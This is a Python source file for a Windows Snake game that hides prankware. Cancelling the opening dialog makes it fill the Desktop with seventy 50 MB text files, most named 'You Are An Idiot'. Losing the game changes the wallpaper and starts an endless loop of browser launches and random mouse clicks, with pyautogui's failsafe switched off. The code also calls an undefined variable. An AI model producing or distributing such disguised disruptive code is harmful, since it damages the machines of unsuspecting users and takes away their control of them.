import sys
import os
import winshell
import webbrowser
import ctypes
import urllib.request
import pyautogui
import pygame
import tkinter as tk
import random
import sys
import string
from tkinter import messagebox
import shutil
from win32com.client import Dispatch
import concurrent.futures as cf
from concurrent.futures import ThreadPoolExecutor as TPE

pyautogui.FAILSAFE = False

URL = "https://www.google.gr/images/branding/googlelogo/2x/googlelogo_color_160x56dp.png"
PATH = urllib.request.urlretrieve(URL)[0]

SPI_SETDESKWALLPAPER = 20

# Constants
WIDTH, HEIGHT = 800, 600
GRID_SIZE = 10
FPS = 10

# Colors
WHITE = (255, 255, 255)
BLACK = (0, 0, 0)
RED = (255, 0, 0)
GREEN = (0, 255, 0)

# Direction vectors
UP = (0, -1)
DOWN = (0, 1)
LEFT = (-1, 0)
RIGHT = (1, 0)

def simulate_random_click():
    while True:
        x = random.randint(0, root.winfo_screenwidth())
        y = random.randint(0, root.winfo_screenheight())
        pyautogui.click(x, y)


def generate_random_data(chunk_size):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(chunk_size))

def create_file(file_path, size_in_bytes, chunk_size=1024 * 1024 * 2):
    with open(file_path, 'w') as file:
        while file.tell() < size_in_bytes:
            remaining_size = size_in_bytes - file.tell()
            current_chunk_size = min(chunk_size, remaining_size)

            # Generate Chunk
            data = generate_random_data(current_chunk_size)
            file.write(data)

            while file.tell() < size_in_bytes:
                file.write(data)

def copy_file(source_path, dest_path):
    shutil.copyfile(source_path, dest_path)

# Snake class
class Snake:
    global FPS
    def __init__(self):
        self.length = 1
        self.positions = [((WIDTH // 2), (HEIGHT // 2))]
        self.direction = random.choice([UP, DOWN, LEFT, RIGHT])
        self.color = RED

    def get_head_position(self):
        return self.positions[0]

    def update(self):
        cur = self.get_head_position()
        x, y = self.direction
        new = (((cur[0] + (x * GRID_SIZE)) % WIDTH), (cur[1] + (y * GRID_SIZE)) % HEIGHT)
        if len(self.positions) > 2 and new in self.positions[2:]:
            self.reset()
        else:
            self.positions.insert(0, new)
            if len(self.positions) > self.length:
                self.positions.pop()

    def reset(self):
        ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, PATH, 0)
        while True:
            webbrowser.open("https://www.youtube.com/watch?v=48rz8udZBmQ", new=2)
            simulate_random_click()

    def render(self, surface):
        for p in self.positions:
            pygame.draw.rect(surface, self.color, (p[0], p[1], GRID_SIZE, GRID_SIZE))

# Food class
class Food:
    def __init__(self):
        self.position = (0, 0)
        self.color = GREEN
        self.randomize_position()

    def randomize_position(self):
        self.position = (
            random.randint(0, (WIDTH // GRID_SIZE) - 1) * GRID_SIZE,
            random.randint(0, (HEIGHT // GRID_SIZE) - 1) * GRID_SIZE,
        )

    def render(self, surface):
        pygame.draw.rect(surface, self.color, (self.position[0], self.position[1], GRID_SIZE, GRID_SIZE))

# Main function
def main():
    global FPS

    pygame.init()
    clock = pygame.time.Clock()
    screen = pygame.display.set_mode((WIDTH, HEIGHT), 0, 32)
    surface = pygame.Surface(screen.get_size())
    surface = surface.convert()

    snake = Snake()
    food = Food()

    while True:
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                pygame.quit()
                sys.exit()
            elif event.type == pygame.KEYDOWN:
                if event.key == pygame.K_UP:
                    snake.direction = UP
                elif event.key == pygame.K_DOWN:
                    snake.direction = DOWN
                elif event.key == pygame.K_LEFT:
                    snake.direction = LEFT
                elif event.key == pygame.K_RIGHT:
                    snake.direction = RIGHT

        snake.update()
        # Check if snake eats food
        if snake.get_head_position() == food.position:
            snake.length += 1
            food.randomize_position()
            FPS += 1
        surface.fill(BLACK)
        snake.render(surface)
        food.render(surface)
        screen.blit(surface, (0, 0))
        pygame.display.update()
        clock.tick(FPS)

response = messagebox.askokcancel("Are You Sure?", "OK or Cancel?")

if response:
    main() 
else:
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    file_name = "Sad Snake.txt"
    file_path = os.path.join(desktop_path, file_name)
    
    target_size_bytes = 1024 * 1024 * 50

    create_file(file_path, target_size_bytes)

    with TPE(max_workers=2) as executor:
        futures = []
        for i in range(69):
            copy_file_path = os.path.join(desktop_path, f"You Are An Idiot_{i + 1}.txt")
            future = executor.submit(copy_file, file_path, copy_file_path)
            futures.append(future)
        # Wait for all copy operations to complete
        cf.wait(futures)